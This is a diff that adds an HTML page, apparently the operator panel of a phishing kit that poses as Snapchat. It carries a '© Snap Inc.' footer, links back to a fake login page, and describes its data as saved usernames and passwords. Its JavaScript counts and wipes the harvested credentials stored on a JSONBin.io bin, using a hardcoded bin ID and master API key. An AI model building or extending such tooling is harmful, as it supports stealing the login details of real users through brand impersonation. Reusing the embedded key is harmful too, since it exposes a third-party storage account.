@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clear Submissions</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
+            padding: 20px;
+        }
+        .container {
+            max-width: 420px;
+            width: 100%;
+            background: white;
+            border-radius: 32px;
+            box-shadow: 0 12px 40px rgba(0,0,0,0.06);
+            padding: 40px 28px 32px;
+            text-align: center;
+        }
+        .icon {
+            font-size: 64px;
+            margin-bottom: 16px;
+        }
+        h1 {
+            font-size: 26px;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 12px;
+        }
+        .subtitle {
+            font-size: 14px;
+            color: #777;
+            margin-bottom: 28px;
+            line-height: 1.5;
+        }
+        .btn-clear {
+            width: 100%;
+            padding: 14px;
+            background: #ff4444;
+            border: none;
+            border-radius: 40px;
+            font-size: 17px;
+            font-weight: 600;
+            color: white;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .btn-clear:hover {
+            background: #cc0000;
+        }
+        .btn-clear:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        .btn-back {
+            width: 100%;
+            padding: 14px;
+            background: transparent;
+            border: 1px solid #ddd;
+            border-radius: 40px;
+            font-size: 17px;
+            font-weight: 600;
+            color: #000;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 12px;
+        }
+        .btn-back:hover {
+            background: #f4f4f4;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 14px;
+            display: none;
+        }
+        .status.success {
+            display: block;
+            background: #e8f5e9;
+            color: #2e7d32;
+        }
+        .status.error {
+            display: block;
+            background: #ffebee;
+            color: #c62828;
+        }
+        .status.loading {
+            display: block;
+            background: #e3f2fd;
+            color: #0d47a1;
+        }
+        .submissions-count {
+            margin-top: 16px;
+            font-size: 13px;
+            color: #888;
+        }
+        .footer {
+            margin-top: 24px;
+            font-size: 11px;
+            color: #aaa;
+        }
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #fffc00;
+            border-top: 3px solid #000;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="icon">🗑️</div>
+    <h1>Clear Submissions</h1>
+    <p class="subtitle">This will permanently delete all saved usernames and passwords from the cloud.</p>
+
+    <button class="btn-clear" id="clearBtn">Clear All Submissions</button>
+    <button class="btn-back" onclick="window.location.href='/'">← Back to Login</button>
+
+    <div class="status" id="status"></div>
+    <div class="submissions-count" id="countDisplay">Loading submissions count...</div>
+    <div class="footer">© Snap Inc. 2026</div>
+</div>
+
+<script>
+    // ---------- REAL CLOUD STORAGE ----------
+    const BIN_ID = '6a31687cf5f4af5e29fbda44';
+    const API_KEY = '$2a$10$tCj51IVJSG2msy/pX3hyR.kjMNQuxmmIHnXwrtD.AjPNq.s6JHBPq';
+    const BASE_URL = 'https://api.jsonbin.io/v3/b/' + BIN_ID;
+
+    const clearBtn = document.getElementById('clearBtn');
+    const statusDiv = document.getElementById('status');
+    const countDisplay = document.getElementById('countDisplay');
+
+    async function loadSubmissions() {
+        try {
+            const response = await fetch(BASE_URL, {
+                headers: { 'X-Master-Key': API_KEY }
+            });
+            if (!response.ok) throw new Error('Network error');
+            const data = await response.json();
+            return data.record.submissions || [];
+        } catch (error) {
+            console.warn('Cloud load failed:', error);
+            const local = localStorage.getItem('snapchat_cloud_submissions');
+            if (local) {
+                try { return JSON.parse(local); } catch (e) { return []; }
+            }
+            return [];
+        }
+    }
+
+    async function saveSubmissions(subs) {
+        try {
+            await fetch(BASE_URL, {
+                method: 'PUT',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Master-Key': API_KEY
+                },
+                body: JSON.stringify({ submissions: subs })
+            });
+            localStorage.setItem('snapchat_cloud_submissions', JSON.stringify(subs));
+        } catch (error) {
+            console.warn('Cloud save failed:', error);
+            localStorage.setItem('snapchat_cloud_submissions', JSON.stringify(subs));
+        }
+    }
+
+    async function updateCount() {
+        const subs = await loadSubmissions();
+        countDisplay.textContent = `📊 ${subs.length} submission${subs.length !== 1 ? 's' : ''} in cloud`;
+        return subs.length;
+    }
+
+    async function clearAll() {
+        // Disable button
+        clearBtn.disabled = true;
+        clearBtn.textContent = 'Clearing...';
+
+        // Show loading status
+        statusDiv.className = 'status loading';
+        statusDiv.innerHTML = '<span class="spinner"></span> Clearing submissions...';
+        statusDiv.style.display = 'block';
+
+        try {
+            // Clear the cloud
+            await saveSubmissions([]);
+
+            // Update count
+            const count = await updateCount();
+
+            // Show success
+            statusDiv.className = 'status success';
+            statusDiv.innerHTML = `✅ Successfully cleared all ${count} submissions!`;
+            clearBtn.textContent = '✅ Cleared!';
+
+            // Re-enable after 2 seconds
+            setTimeout(() => {
+                clearBtn.disabled = false;
+                clearBtn.textContent = 'Clear All Submissions';
+            }, 2000);
+
+        } catch (error) {
+            statusDiv.className = 'status error';
+            statusDiv.innerHTML = '❌ Error clearing submissions. Please try again.';
+            clearBtn.disabled = false;
+            clearBtn.textContent = 'Clear All Submissions';
+        }
+    }
+
+    // Load count on page load
+    updateCount();
+
+    // Clear button handler
+    clearBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        if (confirm('⚠️ Are you sure you want to delete ALL submissions from the cloud? This cannot be undone.')) {
+            clearAll();
+        }
+    });
+
+    console.log('Clear Submissions page loaded. Cloud data stored on JSONBin.io.');
+</script>
+
+</body>
+</html>
